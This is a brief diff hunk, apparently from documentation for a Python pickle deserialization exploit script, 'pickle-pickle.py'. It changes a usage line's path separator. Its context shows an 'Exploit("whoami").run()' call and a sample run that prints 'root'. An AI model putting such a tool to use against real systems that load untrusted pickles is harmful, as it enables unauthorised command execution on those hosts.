@@ -21,7 +21,7 @@ print(Exploit("whoami").run())
 
 # python pickle-pickle.py
 Usage:
-        python .\pickle-pickle.py [FILENAME]
+        python ./pickle-pickle.py [FILENAME]
 
 # python pickle-pickle.py evil.py
 root
